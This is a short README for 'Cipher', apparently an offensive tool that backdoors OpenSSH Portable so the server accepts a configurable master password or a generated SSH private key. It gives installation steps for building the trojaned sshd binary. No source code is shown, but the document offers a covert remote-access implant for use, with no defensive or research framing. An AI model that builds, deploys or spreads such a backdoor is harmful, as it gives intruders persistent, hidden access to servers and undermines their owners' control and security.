# Cipher
## Author: MeHungr (Dylan Weber)

Cipher is an OpenSSH Portable backdoor that allows authentication using a specific password or generated SSH private key. The password is configurable in `auth-universal.h`.

## Installation
1. Configure password in `auth-universal.h`
2. Run install/install.
- This will set up the ssh key and build the executables
3. Output will be in <project-root>/output
4. The server executable is output/sbin/sshd
